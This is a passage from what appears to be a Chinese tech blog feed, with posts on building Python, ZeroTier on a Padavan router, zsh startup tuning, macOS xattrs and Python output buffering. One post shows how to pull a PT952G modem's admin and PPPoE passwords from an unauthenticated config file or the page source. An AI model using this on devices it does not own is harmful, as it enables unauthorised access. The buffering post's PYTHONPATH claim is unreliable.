<p>编译安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./configure --prefix=/usr/local/python3 --enable-optimizations</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
<p><strong><em>注：<code>--enable-optimizations</code> 配置项用于提高 Python 安装后的性能，使用会导致编译速度稍慢</em></strong></p>
<h2 id="添加软连接"><a href="#添加软连接" class="headerlink" title="添加软连接"></a>添加软连接</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ln</span> -s /usr/local/python3/bin/python3.8 /usr/bin/python3</span><br><span class="line">$ <span class="built_in">ln</span> -s /usr/local/python3/bin/pip3.8 /usr/bin/pip3</span><br></pre></td></tr></table></figure>

<p>命令行输入 <code>python3 -V</code> 查看是否安装成功。</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li>本文是以 Python3.8.1 为例，如果安装其他版本可参考更改文中的 Python 下载地址，相关命令也需按需更改。</li>
<li>文中使用的命令如果出现权限不够请自行加上 <code>sudo</code>。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://github.com/pyenv/pyenv/wiki/Common-build-problems">Common build problems · pyenv/pyenv Wiki · GitHub</a></li>
<li><a href="https://segmentfault.com/a/1190000015628625">CentOS 7 下 安装 Python3.7 - 个人文章 - SegmentFault 思否</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>老毛子 Padavan  路由器安装 ZeroTier</title>
    <url>/2019/07/14/newifi-zerotier/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>家里的 Newifi mini 路由器安装了老毛子 Padavan 系统。本文将介绍 Padavan 如何安装 ZeroTier，从而可以远程连接家中的路由器。</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>什么是老毛子改 Padavan 固件，老毛子即是对老外（一般指俄罗斯人）的统称，就是说国外的大牛基于某些开源项目比如基于华硕开源的衍生出来的系列 Padavan 系统。</p>
<span id="more"></span>

<h1 id="Entware"><a href="#Entware" class="headerlink" title="Entware"></a>Entware</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>Entware 是一个适用于嵌入式系统的软件包库，使用 opkg 包管理系统进行管理，官方源上有超过 2000 个软件包。</p>
<p>官方地址：<a href="https://entware.net/">Entware</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="新建-opt-文件夹"><a href="#新建-opt-文件夹" class="headerlink" title="新建 opt 文件夹"></a>新建 opt 文件夹</h3><p>在电脑上格式化的 U 盘为 ext4 格式，<strong>在格式化后的 U 盘根目录新建一个 <code>opt</code> 文件夹</strong>。（**<em>Ps: 此步骤很重要！！！**</em>）</p>
<h3 id="开启-Entware"><a href="#开启-Entware" class="headerlink" title="开启 Entware"></a>开启 Entware</h3><p>将格式化后的 U 盘插入路由器，并进入路由器管理页面：<a href="192.168.123.1">192.168.123.1</a><br><img src="/images/newifi-zerotier1.png"></p>
<h2 id="查看是否成功挂载-opt"><a href="#查看是否成功挂载-opt" class="headerlink" title="查看是否成功挂载 /opt"></a>查看是否成功挂载 /opt</h2><p>进入路由器 Shell，密码为路由器登录页面的密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh admin@192.168.123.1</span><br></pre></td></tr></table></figure>
<p>输入 df -h，如果出现 <code>Mount on</code> 一栏下面出现 <code>/opt</code> 则挂载成功。</p>
<p>如果 opt 没挂载，说明没安装上，请查看 <code>opt</code> 文件夹是否创建正确，注意文件名为小写。</p>
<h2 id="安装-okpg"><a href="#安装-okpg" class="headerlink" title="安装 okpg"></a>安装 okpg</h2><p>进入 Shell 后，在根目录下输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ opkg.sh</span><br></pre></td></tr></table></figure>
<p>等待安装完成后，升级：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ opkg update</span><br></pre></td></tr></table></figure>

<h1 id="安装-ZeroTier"><a href="#安装-ZeroTier" class="headerlink" title="安装 ZeroTier"></a>安装 ZeroTier</h1><p>进入 Shell，输入下列命令进行安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ opkg install zerotier</span><br></pre></td></tr></table></figure>

<p>启动 ZertoTier:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ zerotier-one -d</span><br></pre></td></tr></table></figure>

<p>加入自己的 ZeroTier 网络：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ zerotier-cli join xxxxx(自己的网络 ID)</span><br></pre></td></tr></table></figure>
<p>ZeroTier 网络创建请参考：<a href="https://woodenrobot.me/2019/07/07/zerotier-one-start/">P2P 内网穿透工具 ZeroTier</a></p>
<h1 id="调整防火墙"><a href="#调整防火墙" class="headerlink" title="调整防火墙"></a>调整防火墙</h1><p>需要允许 ZeroTier 创建的虚拟网卡的流量进入，首先查看你自己的虚拟网卡名称：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ifconfig</span><br></pre></td></tr></table></figure>
<p>在命令行输入上述命令后找到你的 ZeroTier 创建的虚拟网卡：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">ztwfuekerg Link encap:Ethernet  HWaddr A6:84:2F:1B:6F:5C</span><br><span class="line">          inet addr:10.121.12.5  Bcast:10.121.12.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:2800  Metric:1</span><br><span class="line">          RX packets:469 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:392 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:500</span><br><span class="line">          RX bytes:42064 (41.0 KiB)  TX bytes:38080 (37.1 KiB)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我的虚拟网卡名即为: <code>ztwfuekerg</code>  </p>
<p>设置防火墙：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ iptables -A INPUT  -i ztwfuekerg -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>杀死当前 ZeroTier:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -wlT | grep <span class="string">&quot;zerotier-one -d&quot;</span> | grep -v grep | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure>
<p>重新启动：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zerotier-one -d</span><br></pre></td></tr></table></figure>
<h1 id="设置-ZeroTier-开机自启"><a href="#设置-ZeroTier-开机自启" class="headerlink" title="设置 ZeroTier 开机自启"></a>设置 ZeroTier 开机自启</h1><p>进入路由器后台，在自定义设置的脚本中选择自定义脚本加入下面命令并点击应用本页面设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动 zerotier</span><br><span class="line">iptables -A INPUT  -i ztwfuekerg -j ACCEPT</span><br><span class="line"></span><br><span class="line">zerotier-one -d</span><br></pre></td></tr></table></figure>
<p><img src="/images/newifi-zerotier2.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=367080">关于Padavan下的zerotier内网穿透设置</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Padavan</tag>
        <tag>内网穿透</tag>
        <tag>ZeroTier</tag>
      </tags>
  </entry>
  <entry>
    <title>优化 oh my zsh 启动速度</title>
    <url>/2020/06/23/ohmyzsh/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于忍受不了越来越慢的 zsh 启动速度，优化了一下 zsh 的启动速度。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>iTerm2 3.3.11</li>
<li>zsh 5.8</li>
<li>oh my zsh(好像没版本号 commit 5ffc0d036c587741fd25092e7809dad2b00b3677)<span id="more"></span>

</li>
</ul>
<h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><p><code>.zshrc</code> 配置文件如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">export</span> ZSH=/Users/woodenrobot/.oh-my-zsh</span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">&quot;ys&quot;</span></span><br><span class="line"></span><br><span class="line">plugins=(</span><br><span class="line">    sudo</span><br><span class="line">    z</span><br><span class="line">    zsh_reload</span><br><span class="line">    safe-paste</span><br><span class="line">    extract</span><br><span class="line">    history-substring-search</span><br><span class="line">    colored-man-pages</span><br><span class="line">    git</span><br><span class="line">    <span class="built_in">history</span></span><br><span class="line">    tmux</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三方插件</span></span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># User configuration</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind key</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^P&#x27;</span> history-substring-search-up</span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^N&#x27;</span> history-substring-search-down</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 语言配置</span></span><br><span class="line"><span class="built_in">export</span> LC_ALL=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LC_CTYPE=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LC_ALL=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LANG=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pyenv</span></span><br><span class="line"><span class="built_in">export</span> PYENV_ROOT=<span class="string">&quot;<span class="variable">$HOME</span>/.pyenv&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nvm</span></span><br><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">&quot;<span class="subst">$([ -z <span class="string">&quot;<span class="variable">$&#123;XDG_CONFIG_HOME-&#125;</span>&quot;</span> ] &amp;&amp; printf %s <span class="string">&quot;<span class="variable">$&#123;HOME&#125;</span>/.nvm&quot;</span> || printf %s <span class="string">&quot;<span class="variable">$&#123;XDG_CONFIG_HOME&#125;</span>/nvm&quot;</span>)</span>&quot;</span></span><br><span class="line">[ -s <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> <span class="comment"># This loads nvm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># virtualenvwrapper</span></span><br><span class="line"><span class="built_in">export</span> WORKON_HOME=<span class="variable">$HOME</span>/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> PROJECT_HOME=<span class="variable">$HOME</span>/Devel</span><br><span class="line"><span class="built_in">source</span> /usr/local/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure>

<p>其中 <code>zsh-syntax-highlighting</code> 和 <code>zsh-autosuggestions</code> 是通过下列方式安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line"></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<p>通过配置文件可以看出，我安装了几个 oh my zsh 自带的插件以及 <code>pyenv</code>、<code>nvm</code>、<code>virtualenvwrapper</code>，安装插件以及其他程序的启动脚本是需要耗费时间的，测试一下 此时 <code>zsh</code> 的启动速度。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ \time zsh -i -c <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>测了三次启动时间如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.54 real         0.78 user         0.73 sys</span><br><span class="line"></span><br><span class="line">1.55 real         0.80 user         0.72 sys</span><br><span class="line"></span><br><span class="line">1.83 real         0.83 user         0.80 sys</span><br></pre></td></tr></table></figure>

<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>为了提高启动速度，先把 <code>pyenv</code>、<code>nvm</code>和<code>virtualenvwrapper</code>程序改为 <code>lazyload</code>，也就是不在 zsh 启动时就启动只在使用它们的时候启动。</p>
<h3 id="nvm-优化"><a href="#nvm-优化" class="headerlink" title="nvm 优化"></a>nvm 优化</h3><p>使用 <code>zsh-nvm</code> 插件实现 <code>nvm</code> 的 lazyload。</p>
<ul>
<li><p>下载插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/lukechilds/zsh-nvm ~/.oh-my-zsh/custom/plugins/zsh-nvm</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在 <code>.zshrc</code> 文件中开启插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  ...</span><br><span class="line">  zsh-nvm</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除 <code>.zshrc</code> 原有的 <code>nvm</code> 启动部分并开启 <code>zsh-nvm</code> 的 lazyload，加入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># zsh-nvm lazy load</span></span><br><span class="line"><span class="built_in">export</span> NVM_LAZY_LOAD=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="pyenv-优化"><a href="#pyenv-优化" class="headerlink" title="pyenv 优化"></a>pyenv 优化</h3><ul>
<li><p>下载插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/davidparsson/zsh-pyenv-lazy.git ~/.oh-my-zsh/custom/plugins/pyenv-lazy</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在 <code>.zshrc</code> 文件中开启插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  ...</span><br><span class="line">  pyenv-lazy</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除 <code>.zshrc</code> 原有的 <code>pyenv</code> 启动部分</p>
</li>
</ul>
<h3 id="virtualenvwrapper-优化"><a href="#virtualenvwrapper-优化" class="headerlink" title="virtualenvwrapper 优化"></a>virtualenvwrapper 优化</h3><ul>
<li>删除原有的 <code>virtualenvwrapper</code> 启动部分；</li>
<li>使用下列 lazyload:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=<span class="variable">$HOME</span>/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> PROJECT_HOME=<span class="variable">$HOME</span>/Devel</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_SCRIPT=/usr/local/bin/virtualenvwrapper.sh</span><br><span class="line"><span class="built_in">source</span> /usr/local/bin/virtualenvwrapper_lazy.sh</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="完整配置"><a href="#完整配置" class="headerlink" title="完整配置"></a>完整配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">export</span> ZSH=/Users/woodenrobot/.oh-my-zsh</span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">&quot;ys&quot;</span></span><br><span class="line"></span><br><span class="line">plugins=(</span><br><span class="line">    sudo</span><br><span class="line">    z</span><br><span class="line">    zsh_reload</span><br><span class="line">    safe-paste</span><br><span class="line">    extract</span><br><span class="line">    history-substring-search</span><br><span class="line">    colored-man-pages</span><br><span class="line">    git</span><br><span class="line">    <span class="built_in">history</span></span><br><span class="line">    tmux</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三方插件</span></span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">    pyenv-lazy</span><br><span class="line">    zsh-nvm</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># User configuration</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind key</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^P&#x27;</span> history-substring-search-up</span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^N&#x27;</span> history-substring-search-down</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 语言配置</span></span><br><span class="line"><span class="built_in">export</span> LC_ALL=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LC_CTYPE=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LC_ALL=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LANG=<span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># virtualenvwrapper lazy load</span></span><br><span class="line"><span class="built_in">export</span> WORKON_HOME=<span class="variable">$HOME</span>/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> PROJECT_HOME=<span class="variable">$HOME</span>/Devel</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_SCRIPT=/usr/local/bin/virtualenvwrapper.sh</span><br><span class="line"><span class="built_in">source</span> /usr/local/bin/virtualenvwrapper_lazy.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># zsh-nvm lazy load</span></span><br><span class="line"><span class="built_in">export</span> NVM_LAZY_LOAD=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>优化完了测试一下现在的启动速度，老规矩测三次：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0.30 real         0.16 user         0.11 sys</span><br><span class="line"></span><br><span class="line">0.26 real         0.14 user         0.10 sys</span><br><span class="line"></span><br><span class="line">0.28 real         0.15 user         0.11 sys</span><br></pre></td></tr></table></figure>

<p><strong><em>效果感人！！！</em></strong><br><strong><em>效果感人！！！</em></strong><br><strong><em>效果感人！！！</em></strong></p>
<h2 id="歪门邪道"><a href="#歪门邪道" class="headerlink" title="歪门邪道"></a>歪门邪道</h2><p>zsh 启动速度上来了但是新建一个 iTerm2 tab 好像还是有点慢做不到秒开。网上看到一个不知道什么原理的设置：</p>
<p>进入 iTerm2 的偏好设置里，在 Profiles 里编辑你的配置，在配置右侧的 General 选项卡里，Command 里选择为 Command，然后里边写入 /usr/bin/login -pfq xxx 其中 xxx 是你的用户名。</p>
<p>按照这个配置好，感觉是有那么一点点更快了（更慢了）？总之在我这里改动带来的体验并没有那么大，大家有兴趣可以去试试。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://github.com/lukechilds/zsh-nvm">GitHub - lukechilds/zsh-nvm: Zsh plugin for installing, updating and loading nvm</a></li>
<li><a href="https://github.com/davidparsson/zsh-pyenv-lazy.git">GitHub - davidparsson/zsh-pyenv-lazy: A zsh plugin for lazy loading of pyenv</a></li>
<li><a href="https://virtualenvwrapper.readthedocs.io/en/latest/install.html#lazy-loading">Installation — virtualenvwrapper 5.0.1.dev2 documentation</a></li>
<li><a href="https://blog.jonslow.com/iterm2-launch-accelerate/">iTerm 2、Terminal 启动加速</a></li>
<li><a href="https://www.logcg.com/archives/2376.html">让 iTrem 2 + zsh 启动不再等待！ | 落格博客</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Oh My Zsh</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac OS 系统无法双击使用 Chrome 浏览器打开 HTML 文件</title>
    <url>/2022/06/06/open-html/</url>
    <content><![CDATA[<p>Mac OS 系统中文件经常会被附加上特有的扩展属性 ( extend attributes )，具体表现是用 ls -l 查看时会有 @ 的标记,比如:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l</span></span><br><span class="line">.rw-rw-r--@  6.5k woodenrobot  3 Aug  2020 index.html</span><br></pre></td></tr></table></figure>
<p>这个 @ 属性是在 Finder 中对文件进行任意操作后被增加上的，把 @ 属性去掉后就可以正常双击 HTML 文件使用 Chrome 打开了。</p>
<p>清除一个文件的所有扩展属性的方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">xattr -c filename</span> </span><br></pre></td></tr></table></figure>
<p>清除目录所有文件扩展属性的方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">xattr -rc dirpath</span> </span><br></pre></td></tr></table></figure>
<p>清除当前目录下所有文件扩展属性的方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">xattr -rc .</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Mac OS</tag>
      </tags>
  </entry>
  <entry>
    <title>获取联通友华 PT952G 光猫超级密码和宽带拨号账号密码</title>
    <url>/2020/11/14/pt925g/</url>
    <content><![CDATA[<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>直接在浏览器地址栏里输入：<a href="http://192.168.1.1/backupsettings.conf">http://192.168.1.1/backupsettings.conf</a><br>，按下回车键后，将会把这个配置文件下载下来，这个配置文件就是光猫的配置文件，里面包含了管理员密码。</p>
<p>下载完毕后，将其打开，然后在里面搜索 <code>AdminPassword</code>，找到后，位于 <code>&lt;AdminPassword&gt;</code> 和 <code>&lt;/AdminPassword&gt;</code> 之间的部分就是管理员密码了，一般为CUAdmin+八位数字，比如CUAdmin12345678。一串乱码的话 <code>Q1VBZG1pbjEyMzQ1Njc4</code> 是管理员密码使用了 Base64 编码了，可以这个网站解码：<a href="https://tool.oschina.net/encrypt?type=3">在线加密解密</a></p>
<p>宽带的拨号账号和密码在下列位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;WANPPPConnection instance=&quot;1&quot;&gt;</span><br><span class="line">          &lt;Enable&gt;TRUE&lt;/Enable&gt;</span><br><span class="line">          ...</span><br><span class="line">          &lt;Username&gt;XXXXXX&lt;/Username&gt;</span><br><span class="line">          &lt;Password&gt;YYYYYY&lt;/Password&gt;</span><br></pre></td></tr></table></figure>
<p>先找到 <code>WANPPPConnection instance=&quot;1&quot;</code>下面几行后有一个 <code>Username</code> 和 <code>Password</code> 里面的 <code>XXXXXX</code> 和 <code>YYYYYY</code> 分别就为宽带拨号的账号和密码，密码可能也是 Base64 编码的，使用<a href="https://tool.oschina.net/encrypt?type=3">在线加密解密</a>解码就可以了。</p>
<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>进入路由器更改普通用户密码页面：<a href="http://192.168.1.1/main.html?page=4">http://192.168.1.1/main.html?page=4</a></p>
<p>F12 打开开发者工具在网页源码里搜 <code>pwdAdmin</code> 后面就是管理员密码。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>[转] Python 的 Buffer 机制</title>
    <url>/2019/08/20/python-buffer/</url>
    <content><![CDATA[<blockquote>
<p>本文转载于：<a href="https://www.oyohyee.com/post/Note/python_buffer/">Python的Buffer机制</a></p>
</blockquote>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Python版本: <code>3.7.1</code>(3.7以上版本)<br>清空 <code>PYTHONUNBUFFERED</code> 环境变量(默认是空的,不过以防万一还是清空下)</p>
<p>cmd 清空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set PYTHONUNBUFFERED=&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>powershell 清空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$env:PYTHONUNBUFFERED=&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>bash 清空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PYTHONUNBUFFERED=&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>将下面内容<strong>保存到 <code>test.py</code> 中</strong>,执行下面的语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.stdout.write(&quot;stdout1 &quot;)</span><br><span class="line">sys.stderr.write(&quot;stderr1 &quot;)</span><br><span class="line">sys.stdout.write(&quot;stdout2 &quot;)</span><br><span class="line">sys.stderr.write(&quot;stderr2 &quot;)</span><br></pre></td></tr></table></figure>

<p>执行 <code>python test.py</code>, 输出 <code>stderr1 stderr2 stdout1 stdout2</code><br>执行 <code>python -u test.py</code>, 输出 <code>stdout1 stderr1 stdout2 stderr2</code></p>
<span id="more"></span>

<h2 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h2><h3 id="现象解释"><a href="#现象解释" class="headerlink" title="现象解释"></a>现象解释</h3><p>对于 <code>stderr</code>,其名称是标准错误输出文件,标准里规定是无缓冲的,每次输出一个字符就直接显示到屏幕上<br>而对于 <code>stdout</code>,其名称是标准输出文件,<strong>UNIX标准里</strong>规定是行缓冲的,遇到换行或者积累到一定的大小一次性输出到屏幕上</p>
<p>由于默认情况下,缓冲区是开启的。<br>因此 <code>stdout</code> 的输出会先存入到一个 buffer 中,而 <code>stderr</code> 的内容是直接显示的,因此默认输出顺序是 <code>stderr1 stderr2 stdout1 stdout2</code></p>
<p>当将其改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.stdout.write(&quot;stdout1\n&quot;)</span><br><span class="line">sys.stderr.write(&quot;stderr1\n&quot;)</span><br><span class="line">sys.stdout.write(&quot;stdout2\n&quot;)</span><br><span class="line">sys.stderr.write(&quot;stderr2\n&quot;)</span><br></pre></td></tr></table></figure>

<p>由于 <code>stdout</code> 是行缓冲,遇到换行后也是直接输出,因此此时输出内容就是正常顺序</p>
<p>对于 Python 而言，其规定如下：</p>
<ul>
<li>对于 Python2.x: stdout 行缓存, stderr 是无缓冲(和规范相同)</li>
<li>对于 Python3.x: stdout 和 stderr 都是行缓冲</li>
</ul>
<p>关于该改动的讨论: <a href="https://bugs.python.org/issue13597">Improve documentation of stdout/stderr buffering in Python 3.x</a></p>
<p>而对于 <code>-u</code> 参数:</p>
<ul>
<li>对于 3.6 以下版本: 二进制流使用 unbuffered (不使用 buffer ),但是文本流采用 line-buffer(<a href="https://docs.python.org/3.6/using/cmdline.html#cmdoption-u">3.6  相关文档</a>)</li>
<li>对于 3.7 以上版本: 全部采用 unbuffered(<a href="https://docs.python.org/3.7/using/cmdline.html#cmdoption-u">3.7 相关文档</a>)</li>
</ul>
<p>而当 <code>PYTHONPATH</code> 不为空,视为使用了 <code>-u</code> 参数</p>
<p>虽然输出结果与行缓冲与无缓冲的结果相同，但是仍然需要注意这里并非是如同规范那样定义</p>
<h3 id="什么时候不应该使用缓冲区"><a href="#什么时候不应该使用缓冲区" class="headerlink" title="什么时候不应该使用缓冲区"></a>什么时候不应该使用缓冲区</h3><p>一般来说,第一次接触缓冲区应该都是C语言读入部分</p>
<p>比如如果要有用户交互输入数据,需要分析输入内容,可能会牵扯到换行的处理  </p>
<p>当用户一次性输入很多数据时,这些数据都会被存放在输入缓冲区内,每次使用 <code>getchar()</code>;或者 <code>scanf(&quot;%c&quot;, &amp;c)</code>;会从中取出一个字符出来</p>
<p>这时,如果输入末尾有无效输入,比如用户多打了个空格才换行等奇怪的操作,可能会导致输入缓冲区留下一部分数据,从而导致下一次处理数据出错</p>
<p>这时,往往要使用 <code>fflush(stdin)</code>;在每次读入前清空缓冲区,以确保读到的数据是用户刚刚输入的内容</p>
<p>在 Python 中,最常见的操作是使用 flask、django 时,后台打印 log。</p>
<p>当同时有两个请求送达,两个打印 log 的操作同时写入输出缓冲区,很可能你看到的就是两个 log 混杂在一起的内容,这时为了保证 log 的完整以及有序,就应该关闭缓冲区</p>
<p>而在Python中,关闭缓冲区有三种方法:</p>
<ul>
<li><code>sys.stdout.flush()</code></li>
<li><code>python -u xxx.py</code></li>
<li><code>set PYTHONUNBUFFERED=&quot;&quot;</code></li>
</ul>
